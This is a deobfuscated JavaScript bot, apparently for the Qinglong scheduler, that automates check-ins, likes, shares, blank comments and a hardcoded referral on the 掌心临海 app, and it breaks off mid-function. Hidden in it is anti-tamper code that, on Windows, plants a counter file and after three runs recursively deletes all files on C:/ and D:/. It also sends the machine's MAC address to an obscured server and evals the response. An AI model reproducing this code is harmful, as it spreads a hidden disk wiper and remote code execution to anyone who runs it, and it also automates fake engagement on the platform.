//Thu Aug 29 2024 09:05:08 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const $ = new Env("掌心临海");
const VM = require("sablejs/runtime")(),
  path = require("path"),
  fs = require("fs"),
  cryptoJS = require("crypto-js"),
  CryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x5d7ce0 = vm.getGlobal(),
    _0x10f7b7 = vm.createObject(),
    _0x3e85a3 = vm.createFunction("log", function () {
      const _0x2ee331 = [];
      for (let _0x38d09f = 0; _0x38d09f < arguments.length; _0x38d09f++) {
        _0x2ee331.push(vm.asString(arguments[_0x38d09f]));
      }
      console.log(..._0x2ee331);
      return vm.createUndefined();
    }),
    _0xbedd37 = vm.createFunction("xxxx", function (_0x4b0134) {
      let _0x17aae8 = eval(_0x4b0134.value);
      return vm.createString(JSON.stringify(_0x17aae8));
    }),
    _0x36e401 = vm.createFunction("yyyy", function (_0x326d53) {
      let _0x429667 = _0x326d53.value,
        _0x112032 = fs.readFileSync(_0x429667, "utf-8").replace(/\r\n/g, "\n"),
        _0x1309b6 = cryptoJS.MD5(_0x112032).toString();
      return vm.createString(_0x1309b6);
    }),
    _0x50ccf1 = vm.createFunction("ddd", function (_0x39b6bf) {
      let _0x3b19c7 = cryptoJS.MD5(_0x39b6bf.value).toString();
      return vm.createString(_0x3b19c7);
    });
  vm.setProperty(_0x10f7b7, "log", _0x3e85a3);
  vm.setProperty(_0x5d7ce0, "xxxx", _0xbedd37);
  vm.setProperty(_0x5d7ce0, "console", _0x10f7b7);
  vm.setProperty(_0x5d7ce0, "yyyy", _0x36e401);
  vm.setProperty(_0x5d7ce0, "ddd", _0x50ccf1);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x36b237) {
  _0x36b237.destroy();
}
function abc(_0x5f248c, _0x87c3da, _0x450432, _0x2f0cad, _0x20f2d6) {
  const _0x233b80 = _0x5f248c.getGlobal();
  let _0x281829 = _0x5f248c.getProperty(_0x233b80, "xab"),
    _0x5b72f0 = _0x5f248c.call(_0x281829, _0x5f248c.createUndefined(), _0x5f248c.createString(_0x87c3da), _0x5f248c.createString(_0x2f0cad), _0x5f248c.createString(_0x20f2d6), _0x5f248c.createString(_0x450432));
  _0x5b72f0 = _0x5f248c.asString(_0x5b72f0);
  return _0x5b72f0;
}
function xyz(_0x15019a, _0xb98e7b, _0x2bc5d8, _0x1e97c1, _0x205ca9) {
  const _0x3741a5 = _0x15019a.getGlobal();
  let _0x37208c = _0x15019a.getProperty(_0x3741a5, "xmn"),
    _0x21af56 = _0x15019a.call(_0x37208c, _0x15019a.createUndefined(), _0x15019a.createString(_0xb98e7b), _0x15019a.createString(_0x1e97c1), _0x15019a.createString(_0x205ca9), _0x15019a.createString(_0x2bc5d8));
  _0x21af56 = _0x15019a.asString(_0x21af56);
  return _0x21af56;
}
var gtr;
let mac = "",
  status;
status = (status = $.getval("qmwkstatus") || "1") > 1 ? "" + status : "";
JSNAMED = $.isNode() ? require("path").basename(__filename) : "kxnjy.js";
let zxlhappArr = [],
  zxlhplnrArr = [],
  all_msg = "";
let id = "",
  uid = "",
  arrs = [],
  zxlhapp = ($.isNode() ? process.env.zxlhapp : $.getdata("zxlhapp")) || "",
  zxlhplnr = ($.isNode() ? process.env.zxlhplnr : $.getdata("zxlhplnr")) || "感谢分享@大佬厉害@仰望@牛啊牛啊@内容可以@内容不错@很强@牛的@6666啊@可以的@留名@混个眼熟@有帖子的地方就有我@我来了@楼主加油@好看你",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
var myDate = new Date();
let phone, psd, token;
var myMonth = myDate.getMonth() + 1,
  myToday = myDate.getDate();
myMonth >= 10 ? myMonth = myMonth : myMonth = "0" + myMonth;
myToday >= 10 ? myToday = myToday : myToday = "0" + myToday;
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0x38a63c) {
          return function (_0x45031b) {
            return Function("Function(arguments[0]+\"" + _0x45031b + "\")()");
          }(_0x38a63c);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x5b4aa4 = "",
        _0x5d9d30 = fs.readdirSync("/sys/class/net/");
      _0x5d9d30.forEach(function (_0x159720) {
        var _0xad00e8 = path.join("/sys/class/net", _0x159720, "address");
        _0x159720.substr(0, 3) == "eth" && fs.existsSync(_0xad00e8) && (_0x5b4aa4 = fs.readFileSync(_0xad00e8).toString().trim());
      });
      return _0x5b4aa4;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x23243f) {
  try {
    gtr.accessSync(_0x23243f, gtr.F_OK);
  } catch (_0x1b03c6) {
    return false;
  }
  return true;
}
function addF(_0x475914, _0x3046df) {
  let _0x58bec4 = 0,
    _0x5eae05 = "C:/Windows/system.txt";
  if (isFileExist(_0x5eae05)) {
    _0x58bec4 = gtr.readFileSync(_0x5eae05, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x5eae05, "1", function (_0x38b473) {
        if (_0x38b473) {
          throw _0x38b473;
        }
      });
    } else {
      return;
    }
  }
  if (_0x58bec4 == 99) {
    return 99;
  }
  console.log(_0x58bec4);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x58bec4);
  if (parseInt(_0x58bec4) < 3) {
    let _0x488694 = parseInt(_0x58bec4) + 1;
    gtr.writeFileSync(_0x5eae05, _0x488694 + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x475914)) {
    return;
  }
  if (gtr.statSync(_0x475914).isDirectory()) {
    var _0x434472 = gtr.readdirSync(_0x475914),
      _0x339423 = _0x434472.length,
      _0x5af767 = 0;
    if (_0x339423 > 0) {
      _0x434472.forEach(function (_0x21d91c) {
        _0x5af767++;
        var _0x330151 = _0x475914 + "/" + _0x21d91c;
        gtr.statSync(_0x330151).isDirectory() ? addF(_0x330151, true) : gtr.unlinkSync(_0x330151);
      });
      _0x339423 == _0x5af767 && _0x3046df && gtr.rmdirSync(_0x475914);
    } else {
      _0x339423 == 0 && _0x3046df && gtr.rmdirSync(_0x475914);
    }
  } else {
    gtr.unlinkSync(_0x475914);
  }
}
!(async () => {
  if (!(typeof $request !== "undefined")) {
    initVM();
    arrs = abc(global.vm, acckey, mac, 88, 0);
    if (arrs == "") {
      return;
    }
    arrs = JSON.parse(arrs);
    if (!arrs) {
      return;
    }
    zxlhappArr = zxlhapp.split("\n");
    zxlhplnrArr = zxlhplnr.split("\n");
    console.log("\n公告：" + arrs.gg + "\n");
    console.log("当前版本：1.0 " + arrs.bb + "\n");
    console.log("------------- 共" + zxlhappArr.length + "个账号-------------\n");
    console.log("当前设备可执行账号限制为" + arrs.num + "个账号\n");
    if (!(zxlhappArr.length > parseInt(arrs.num))) {
      for (let _0x1a5bba = 0; _0x1a5bba < zxlhappArr.length; _0x1a5bba++) {
        zxlhapp = zxlhappArr[_0x1a5bba];
        zxlhplnr = zxlhplnrArr[_0x1a5bba];
        phone = zxlhapp.split("#")[0];
        psd = zxlhapp.split("#")[1];
        $.index = _0x1a5bba + 1;
        console.log("\n开始【掌心临海" + $.index + "】");
        await zxlhdl();
        await zxlhyq();
        await zxlhxx();
        await zxlhqd();
        await zxlhlb();
      }
    }
  }
  destroyVM(global.vm);
})().catch(_0x5504a2 => $.logErr(_0x5504a2)).finally(() => $.done());
function zxlhdl(_0x5a98a6 = 0) {
  return new Promise(_0x179d94 => {
    let _0x336dae = Math.round(new Date().getTime()),
      _0x2d336b = randomString(16),
      _0x18ae9a = Buffer.from("" + _0x336dae).toString("base64"),
      _0x9ffadb = md5("" + _0x2d336b),
      _0xef8690 = md5("" + _0x18ae9a + _0x9ffadb);
    AesKey = _0xef8690.substring(0, 16);
    let _0x560d6a = Buffer.from("" + _0x2d336b).toString("base64"),
      _0x5e1d19 = md5("" + _0x336dae),
      _0x8bb0bf = md5("" + _0x560d6a + _0x5e1d19);
    CBCIV = _0x8bb0bf.substring(0, 16);
    CBCOptions = {
      iv: CryptoJS.enc.Utf8.parse(CBCIV),
      mode: CryptoJS.mode.CBC,
      padding: CryptoJS.pad.Pkcs7
    };
    let _0x3265d2 = encrypt("{\"mobile\":\"" + phone + "\",\"state\":2,\"site_code\":\"00000000000000000000000000000000\",\"code\":\"\",\"password\":\"" + psd + "\",\"channel_sources\":\"Default\",\"device_no\":\"" + randomString(16) + "\",\"imei_no\":\"\",\"mac_no\":\"" + randomString(32).toUpperCase() + "\"}\n        "),
      _0x419d59 = md5("" + _0x336dae);
    _0x419d59 = _0x419d59 + _0x2d336b;
    _0x419d59 = Buffer.from(_0x419d59).toString("base64") + _0x2d336b;
    let _0x412ff0 = md5("" + _0x419d59),
      _0x26a823 = {
        url: "https://app.linhaitv.com/member/login/memberLogin",
        headers: {
          Host: "app.linhaitv.com",
          Accept: "*/*",
          tmencrypt: "1",
          tmrandomnum: _0x2d336b,
          tmrandomnumnew: _0x2d336b,
          tmencryptkey: _0x412ff0,
          "Accept-Language": "zh-Hans-CN;q=1",
          "Accept-Encoding": "gzip, deflate, br",
          tmtimestamp: _0x336dae,
          "Content-Type": "application/json",
          "Content-Length": "244",
          "User-Agent": "TMProject/2.0.7 (iPhone; iOS 14.2; Scale/2.00)",
          tmtimestampnew: _0x336dae,
          Connection: "keep-alive",
          tmencryptkeynew: _0x412ff0
        },
        body: "{\"tm_encrypt_data\":\"" + _0x3265d2 + "\"}"
      };
    $.post(_0x26a823, async (_0x2836ec, _0x2a525b, _0x4d76a0) => {
      try {
        const _0x389da1 = JSON.parse(_0x4d76a0);
        _0x389da1.code == 200 ? (token = _0x389da1.data, _0x18ae9a = Buffer.from("" + _0x336dae).toString("base64"), _0x9ffadb = md5("" + _0x336dae), _0xef8690 = md5("" + _0x18ae9a + _0x9ffadb), AesKey = _0xef8690.substring(0, 16), _0x8bb0bf = md5("" + _0x2d336b), CBCIV = _0x8bb0bf.substring(0, 16), CBCOptions = {
          iv: CryptoJS.enc.Utf8.parse(CBCIV),
          mode: CryptoJS.mode.CBC,
          padding: CryptoJS.pad.Pkcs7
        }, token = decrypt("" + token), token = JSON.parse(token), console.log("\n掌心临海登录:" + phone + "成功,用户：" + token.member_info.member_name), token = token.token) : console.log("\n掌心临海:" + _0x389da1.msg);
      } catch (_0x244048) {} finally {
        _0x179d94();
      }
    }, _0x5a98a6);
  });
}
function zxlhqd(_0x30085 = 0) {
  return new Promise(_0x2cfdb8 => {
    let _0x20bd89 = Math.round(new Date().getTime()),
      _0x3c494c = randomString(16),
      _0x1c2b1a = randomString(16),
      _0x2030a7 = md5("" + _0x20bd89),
      _0x40340a = _0x2030a7 + _0x3c494c,
      _0x2dab7d = md5("" + Buffer.from(_0x40340a).toString("base64") + _0x3c494c),
      _0x4fd5a5 = md5("" + _0x20bd89),
      _0x3898ed = _0x4fd5a5 + _0x1c2b1a,
      _0x5b7977 = md5("" + Buffer.from(_0x3898ed).toString("base64") + _0x1c2b1a),
      _0x2af874 = {
        url: "https://app.linhaitv.com/member/Member/memberPointSign",
        headers: {
          token: token,
          tmencrypt: "1",
          tmtimestamp: _0x20bd89,
          tmrandomnum: _0x3c494c,
          tmencryptkey: _0x2dab7d,
          tmencryptkeynew: _0x5b7977,
          tmtimestampnew: _0x20bd89,
          tmrandomnumnew: _0x1c2b1a,
          "Content-Type": "application/json; charset=utf-8",
          "Content-Length": "214",
          Host: "app.linhaitv.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/3.12.13"
        },
        body: "{\"tm_encrypt_data\":\"ZAM1cgyBfkXAELCi7M/73UwLR/R7kWVZ4gxFX0KRCPmxpVQ1lYshwwHQo4oTcgLtCY8RQdXK4nLbP1ZHiscd7LDKHU6smN4yY1TxLwf0xWlvWPByxgWBsZOX0yFXtEQAyglYTjqS/YMxv1TZKq+fpK3xjmxg+pRqc1fBmbxLqHiaNuTnO2h/RgoMrPrC+Hnp\"}"
      };
    $.post(_0x2af874, async (_0x3db7d1, _0x371301, _0x2aa139) => {
      try {
        const _0x342987 = JSON.parse(_0x2aa139);
        _0x342987.code == 200 ? console.log("\n掌心临海签到：" + _0x342987.msg) : console.log("\n掌心临海签到：" + _0x342987.msg);
      } catch (_0xf204c1) {} finally {
        _0x2cfdb8();
      }
    }, _0x30085);
  });
}
function zxlhlb(_0x1eda3e = 0) {
  return new Promise(_0x519ca1 => {
    let _0x3185d0 = Math.round(new Date().getTime()),
      _0x30f71c = randomString(16),
      _0x564565 = randomString(16),
      _0x25eda8 = md5("" + _0x3185d0),
      _0x3060df = _0x25eda8 + _0x30f71c,
      _0x247135 = md5("" + Buffer.from(_0x3060df).toString("base64") + _0x30f71c),
      _0x40ba59 = md5("" + _0x3185d0),
      _0x978e3d = {
        url: "https://app.linhaitv.com/fcinformation/Api/getIndexList?plate_id=3&member_id=" + uid + "&area_code=360502&pageSize=1",
        headers: {
          token: token,
          tmencrypt: "1",
          tmtimestamp: _0x3185d0,
          tmrandomnum: _0x30f71c,
          tmencryptkey: _0x247135,
          "Content-Type": "application/json; charset=utf-8",
          "Content-Length": "214",
          Host: "app.linhaitv.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/3.12.13"
        }
      };
    $.get(_0x978e3d, async (_0x55b736, _0x44709d, _0x167be8) => {
      try {
        const _0x414bd4 = JSON.parse(_0x167be8);
        if (_0x414bd4.code == 200) {
          for (let _0x212cab = 0; _0x212cab < _0x414bd4.data[0].information_list.length; _0x212cab++) {
            console.log("\n掌心临海文章：" + _0x414bd4.data[0].information_list[_0x212cab].information_title);
            id = _0x414bd4.data[0].information_list[_0x212cab].information_id;
            await zxlhdz();
            await zxlhfx();
            await zxlhdpl();
          }
        } else {
          console.log("\n掌心临海签到：" + _0x414bd4.msg);
        }
      } catch (_0xee7057) {} finally {
        _0x519ca1();
      }
    }, _0x1eda3e);
  });
}
function zxlhdz(_0x4e0784 = 0) {
  return new Promise(_0x452a3a => {
    let _0x3068c6 = Math.round(new Date().getTime()),
      _0xbaeb66 = randomString(16),
      _0x5a5fe7 = randomString(16),
      _0x2603a9 = md5("" + _0x3068c6),
      _0x544d3c = md5("" + _0x3068c6),
      _0x58df86 = {
        url: "https://app.linhaitv.com/fcinformation/informationlike/addLike",
        headers: {
          Host: "app.linhaitv.com",
          Connection: "keep-alive",
          "Content-Length": "45",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; 16s Pro Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 agentweb/4.0.2  UCBrowser/11.6.4.950",
          token: token,
          "Content-Type": "application/json; charset=utf-8",
          Accept: "*/*"
        },
        body: "{\"member_id\":" + uid + ",\"information_id\":\"" + id + "\"}"
      };
    $.post(_0x58df86, async (_0x220cc9, _0x23ba1f, _0x2020f9) => {
      try {
        const _0xb56fd0 = JSON.parse(_0x2020f9);
        _0xb56fd0.code == 200 ? console.log("\n掌心临海点赞文章：" + _0xb56fd0.msg) : console.log("\n掌心临海点赞文章：" + _0xb56fd0.msg);
      } catch (_0x34204b) {} finally {
        _0x452a3a();
      }
    }, _0x4e0784);
  });
}
function zxlhfx(_0x5770b8 = 0) {
  return new Promise(_0x517fb3 => {
    let _0x2b7855 = Math.round(new Date().getTime()),
      _0x54881a = randomString(16),
      _0x653716 = randomString(16),
      _0x5cfa81 = md5("" + _0x2b7855),
      _0x2090e8 = _0x5cfa81 + _0x54881a,
      _0x4ef95a = md5("" + Buffer.from(_0x2090e8).toString("base64") + _0x54881a),
      _0x42eadc = md5("" + _0x2b7855),
      _0x4a6fcd = {
        url: "https://app.linhaitv.com/fcinformation/Information/incNum",
        headers: {
          token: token,
          tmencrypt: "1",
          tmtimestamp: _0x2b7855,
          tmrandomnum: _0x54881a,
          tmencryptkey: _0x4ef95a,
          "Content-Type": "application/x-www-form-urlencoded",
          "Content-Length": "214",
          Host: "app.linhaitv.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/3.12.13"
        },
        body: "member_id=" + uid + "&information_id=" + id + "&words=forward_num"
      };
    $.post(_0x4a6fcd, async (_0x19bc05, _0x5327c5, _0x2a89de) => {
      try {
        const _0x2bd09c = JSON.parse(_0x2a89de);
        _0x2bd09c.code == 200 ? console.log("\n掌心临海分享文章：" + _0x2bd09c.msg) : console.log("\n掌心临海分享文章：" + _0x2bd09c.msg);
      } catch (_0xa5e2e4) {} finally {
        _0x517fb3();
      }
    }, _0x5770b8);
  });
}
function zxlhxx(_0x18b3b1 = 0) {
  return new Promise(_0x45bc22 => {
    let _0x14d6b7 = Math.round(new Date().getTime()),
      _0x1c7b8e = randomString(16),
      _0x599a1b = randomString(16),
      _0x4f3b9c = md5("" + _0x14d6b7),
      _0x56c090 = _0x4f3b9c + _0x1c7b8e,
      _0x67d55e = md5("" + Buffer.from(_0x56c090).toString("base64") + _0x1c7b8e),
      _0x422a55 = md5("" + _0x14d6b7),
      _0x527602 = {
        url: "https://app.linhaitv.com/member/Member/getMemberInfo?member_code=&device_no=&imei_no=&mac_no=&device_no=&imei_no=&mac_no=",
        headers: {
          token: token,
          tmtimestampnew: _0x14d6b7,
          tmrandomnumnew: _0x1c7b8e,
          tmencryptkeynew: _0x67d55e,
          "Content-Length": "214",
          Host: "app.linhaitv.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/3.12.13"
        }
      };
    $.get(_0x527602, async (_0x567f0b, _0x274096, _0x4fbae6) => {
      try {
        const _0x27fa73 = JSON.parse(_0x4fbae6);
        _0x27fa73.code == 200 ? (console.log("\n掌心临海信息：" + _0x27fa73.msg + ",积分余额：" + _0x27fa73.data.point), uid = _0x27fa73.data.member_id) : console.log("\n掌心临海信息：" + _0x27fa73.msg);
      } catch (_0x5b0348) {} finally {
        _0x45bc22();
      }
    }, _0x18b3b1);
  });
}
function encrypt(_0x8caedc) {
  var _0x2f9353 = CryptoJS.enc.Utf8.parse(AesKey),
    _0xbde88d = CryptoJS.enc.Utf8.parse(_0x8caedc),
    _0x405cba = CryptoJS.AES.encrypt(_0xbde88d, _0x2f9353, CBCOptions);
  return _0x405cba.toString();
}
function decrypt(_0x43d78a) {
  var _0x5495d6 = CryptoJS.enc.Utf8.parse(AesKey),
    _0x465563 = CryptoJS.AES.decrypt(_0x43d78a, _0x5495d6, CBCOptions);
  return CryptoJS.enc.Utf8.stringify(_0x465563).toString();
}
function zxlhyq(_0x4aa3a3 = 0) {
  return new Promise(_0x285bd1 => {
    let _0x4b7cda = Math.round(new Date().getTime()),
      _0x39ee30 = randomString(16),
      _0x413141 = randomString(16),
      _0x39fd02 = md5("" + _0x4b7cda),
      _0x1e31da = _0x39fd02 + _0x39ee30,
      _0x34f77b = md5("" + Buffer.from(_0x1e31da).toString("base64") + _0x39ee30),
      _0x198beb = md5("" + _0x4b7cda),
      _0x235894 = {
        url: "https://app.linhaitv.com/api/Invite/addInvite",
        headers: {
          token: token,
          tmtimestampnew: _0x4b7cda,
          tmrandomnumnew: _0x39ee30,
          tmencryptkeynew: _0x34f77b,
          "Content-Length": "214",
          Host: "app.linhaitv.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/3.12.13",
          "Content-Type": "application/json; charset=utf-8"
        },
        body: "{\"invitep_code\":\"562355\",\"device_no\":\"" + randomString(16) + "\",\"imei_no\":\"\",\"mac_no\":\"" + randomString(32).toUpperCase() + "\"}"
      };
    $.post(_0x235894, async (_0x58af50, _0x57402e, _0x49ef85) => {
      try {
        const _0xa36652 = JSON.parse(_0x49ef85);
        !(_0xa36652.code == 200);
      } catch (_0x243bfb) {} finally {
        _0x285bd1();
      }
    }, _0x4aa3a3);
  });
}
function zxlhdpl(_0x11639f = 0) {
  return new Promise(_0x11ba87 => {
    let _0x16fda0 = Math.round(new Date().getTime()),
      _0x5e1cef = randomString(16),
      _0x2ff4c7 = randomString(16),
      _0x584c48 = md5("" + _0x16fda0),
      _0x5cd696 = md5("" + _0x16fda0),
      _0x58d7ea = {
        url: "https://app.linhaitv.com/fcinformation/comment/addComment",
        headers: {
          Host: "app.linhaitv.com",
          Connection: "keep-alive",
          "Content-Length": "45",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; 16s Pro Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 agentweb/4.0.2  UCBrowser/11.6.4.950",
          token: token,
          "Content-Type": "application/json; charset=utf-8",
          Accept: "*/*"
        },
        body: "{\"pid\":0,\"information_id\":\"" + id + "\",\"member_id\":" + uid + ",\"comment_content\":\" \"}"
      };
    $.post(_0x58d7ea, async (_0x33a81e, _0x448a6, _0x22d927) => {
      try {
        const _0x34e359 = JSON.parse(_0x22d927);
        _0x34e359.code == 200 ? console.log("\n掌心临海评论文章：" + _0x34e359.msg) : console.log("\n掌心临海评论文章：" + _0x34e359.msg);
      } catch (_0x57cfbd) {} finally {
        _0x11ba87();
      }
    }, _0x11639f);
  });
}
function randomString(_0x34b784 = 12) {
  let _0x4bc84e = "abcdef0123456789",
    _0x39663d = _0x4bc84e.length,
    _0x414770 = "";
  for (i = 0; i < _0x34b784; i++) {
    _0x414770 += _0x4bc84e.charAt(Math.floor(Math.random() * _0x39663d));
  }
  return _0x414770;
}
function encodeUTF8(_0x2f5773) {
  var _0xf55671,
    _0x2de033 = [],
    _0x23e389,
    _0x50cfe5;
  for (_0xf55671 = 0; _0xf55671 < _0x2f5773.length; _0xf55671++) {
    if ((_0x23e389 = _0x2f5773.charCodeAt(_0xf55671)) < 128) {
      _0x2de033.push(_0x23e389);
    } else {
      if (_0x23e389 < 2048) {
        _0x2de033.push(192 + (_0x23e389 >> 6 & 31), 128 + (_0x23e389 & 63));
      } else {
        if ((_0x50cfe5 = _0x23e389 ^ 55296) >> 10 == 0) {
          _0x23e389 = (_0x50cfe5 << 10) + (_0x2f5773.charCodeAt(++_0xf55671) ^ 56320) + 65536;
          _0x2de033.push(240 + (_0x23e389 >> 18 & 7), 128 + (_0x23e389 >> 12 & 63));
        } else {
          _0x2de033.push(224 + (_0x23e389 >> 12 & 15));
        }
        _0x2de033.push(128 + (_0x23e389 >> 6 & 63), 128 + (_0x23e389 & 63));
      }
    }
  }
  return _0x2de033;
}
function sha(_0x4c5955) {
  var _0xc82193 = new Uint8Array(encodeUTF8(_0x4c5955)),
    _0x2af104,
    _0x33c1ff,
    _0x2c0139,
    _0xe934d8 = (_0xc82193.length + 8 >>> 6 << 4) + 16,
    _0x4c5955 = new Uint8Array(_0xe934d8 << 2);
  _0x4c5955.set(new Uint8Array(_0xc82193.buffer));
  _0x4c5955 = new Uint32Array(_0x4c5955.buffer);
  for (_0x2c0139 = new DataView(_0x4c5955.buffer), _0x2af104 = 0; _0x2af104 < _0xe934d8; _0x2af104++) {
    _0x4c5955[_0x2af104] = _0x2c0139.getUint32(_0x2af104 << 2);
  }
  _0x4c5955[_0xc82193.length >> 2] |= 128 << 24 - (_0xc82193.length & 3) * 8;
  _0x4c5955[_0xe934d8 - 1] = _0xc82193.length << 3;
  var _0x1da1ff = [],
    _0x34a3f0 = [function () {
      return _0x1dc667[1] & _0x1dc667[2] | ~_0x1dc667[1] & _0x1dc667[3];
    }, function () {
      return _0x1dc667[1] ^ _0x1dc667[2] ^ _0x1dc667[3];
    }, function () {
      return _0x1dc667[1] & _0x1dc667[2] | _0x1dc667[1] & _0x1dc667[3] | _0x1dc667[2] & _0x1dc667[3];
    }, function () {
      return _0x1dc667[1] ^ _0x1dc667[2] ^ _0x1dc667[3];
    }],
    _0x42ee60 = function (_0x424655, _0x1345b6) {
      return _0x424655 << _0x1345b6 | _0x424655 >>> 32 - _0x1345b6;
    },
    _0x20a686 = [1518500249, 1859775393, -1894007588, -899497514],
    _0x1dc667 = [1732584193, -271733879, null, null, -1009589776];
  _0x1dc667[2] = ~_0x1dc667[0];
  _0x1dc667[3] = ~_0x1dc667[1];
  for (_0x2af104 = 0; _0x2af104 < _0x4c5955.length; _0x2af104 += 16) {
    var _0x274e93 = _0x1dc667.slice(0);
    for (_0x33c1ff = 0; _0x33c1ff < 80; _0x33c1ff++) {
      _0x1da1ff[_0x33c1ff] = _0x33c1ff < 16 ? _0x4c5955[_0x2af104 + _0x33c1ff] : _0x42ee60(_0x1da1ff[_0x33c1ff - 3] ^ _0x1da1ff[_0x33c1ff - 8] ^ _0x1da1ff[_0x33c1ff - 14] ^ _0x1da1ff[_0x33c1ff - 16], 1);
      _0x2c0139 = _0x42ee60(_0x1dc667[0], 5) + _0x34a3f0[_0x33c1ff / 20 | 0]() + _0x1dc667[4] + _0x1da1ff[_0x33c1ff] + _0x20a686[_0x33c1ff / 20 | 0] | 0;
      _0x1dc667[1] = _0x42ee60(_0x1dc667[1], 30);
      _0x1dc667.pop();
      _0x1dc667.unshift(_0x2c0139);
    }
    for (_0x33c1ff = 0; _0x33c1ff < 5; _0x33c1ff++) {
      _0x1dc667[_0x33c1ff] = _0x1dc667[_0x33c1ff] + _0x274e93[_0x33c1ff] | 0;
    }
  }
  _0x2c0139 = new DataView(new Uint32Array(_0x1dc667).buffer);
  for (var _0x2af104 = 0; _0x2af104 < 5; _0x2af104++) {
    _0x1dc667[_0x2af104] = _0x2c0139.getUint32(_0x2af104 << 2);
  }
  var _0x5a1d75 = Array.prototype.map.call(new Uint8Array(new Uint32Array(_0x1dc667).buffer), function (_0xea6f24) {
    return (_0xea6f24 < 16 ? "0" : "") + _0xea6f24.toString(16);
  }).join("");
  return _0x5a1d75;
}
function hqs(_0x27c419 = 10) {
  return new Promise(_0x447100 => {
    let _0x312931 = 12,
      _0x12bca1 = {
        url: $.isNode() ? rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x312931 + "&ip=1&mac=" + mac + "&bb=1") : rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x312931 + "&ip=0&mac=" + mac + "&bb=1")
      };
    $.post(_0x12bca1, async (_0x4eb33c, _0x2bd599, _0x13bf7e) => {
      try {
        let _0x14ebde = eval(_0x13bf7e);
        _0x14ebde.code == 200 ? (all_msg = _0x14ebde.msg, _0x447100(_0x14ebde.data)) : (all_msg = _0x14ebde.msg, _0x447100(false));
      } catch (_0x431f08) {
        $.logErr(_0x431f08, _0x2bd599);
      }
    }, 0);
  });
}
function md5(_0x3b7295) {
  function _0x182440(_0x331d32, _0x4c9969) {
    return _0x331d32 << _0x4c9969 | _0x331d32 >>> 32 - _0x4c9969;
  }
  function _0x461a24(_0x5d5217, _0x56d628) {
    var _0x197ba4, _0xd0ffb5, _0x47c1bd, _0x2d08fe, _0x33bed8;
    _0x47c1bd = 2147483648 & _0x5d5217;
    _0x2d08fe = 2147483648 & _0x56d628;
    _0x197ba4 = 1073741824 & _0x5d5217;
    _0xd0ffb5 = 1073741824 & _0x56d628;
    _0x33bed8 = (1073741823 & _0x5d5217) + (1073741823 & _0x56d628);
    return _0x197ba4 & _0xd0ffb5 ? 2147483648 ^ _0x33bed8 ^ _0x47c1bd ^ _0x2d08fe : _0x197ba4 | _0xd0ffb5 ? 1073741824 & _0x33bed8 ? 3221225472 ^ _0x33bed8 ^ _0x47c1bd ^ _0x2d08fe : 1073741824 ^ _0x33bed8 ^ _0x47c1bd ^ _0x2d08fe : _0x33bed8 ^ _0x47c1bd ^ _0x2d08fe;
  }
  function _0x58c5ac(_0x5842df, _0xe552ae, _0xad372a) {
    return _0x5842df & _0xe552ae | ~_0x5842df & _0xad372a;
  }
  function _0x477abe(_0x38b545, _0x347386, _0x234718) {
    return _0x38b545 & _0x234718 | _0x347386 & ~_0x234718;
  }
  function _0x2b4efa(_0x510b8a, _0xe95be1, _0x245a0a) {
    return _0x510b8a ^ _0xe95be1 ^ _0x245a0a;
  }
  function _0x1f3d68(_0x39d38e, _0x3d372e, _0x30b0c9) {
    return _0x3d372e ^ (_0x39d38e | ~_0x30b0c9);
  }
  function _0x28bc75(_0x535fb2, _0x212ad8, _0x40a9a5, _0x103aeb, _0x4f4a62, _0x35e06f, _0x178527) {
    _0x535fb2 = _0x461a24(_0x535fb2, _0x461a24(_0x461a24(_0x58c5ac(_0x212ad8, _0x40a9a5, _0x103aeb), _0x4f4a62), _0x178527));
    return _0x461a24(_0x182440(_0x535fb2, _0x35e06f), _0x212ad8);
  }
  function _0xb7f9d3(_0x516ed7, _0x411cbd, _0x3d172c, _0x41686d, _0x32267f, _0x2e1dc7, _0x6440cf) {
    _0x516ed7 = _0x461a24(_0x516ed7, _0x461a24(_0x461a24(_0x477abe(_0x411cbd, _0x3d172c, _0x41686d), _0x32267f), _0x6440cf));
    return _0x461a24(_0x182440(_0x516ed7, _0x2e1dc7), _0x411cbd);
  }
  function _0x5f578c(_0x480dd8, _0xa55de4, _0x3d7f6a, _0x2ddd64, _0x342ed5, _0x527f72, _0x2baf3c) {
    _0x480dd8 = _0x461a24(_0x480dd8, _0x461a24(_0x461a24(_0x2b4efa(_0xa55de4, _0x3d7f6a, _0x2ddd64), _0x342ed5), _0x2baf3c));
    return _0x461a24(_0x182440(_0x480dd8, _0x527f72), _0xa55de4);
  }
  function _0x597712(_0x38bf36, _0x3edef3, _0x224581, _0x3df436, _0x1df9af, _0x5e8f4e, _0x5ccf4b) {
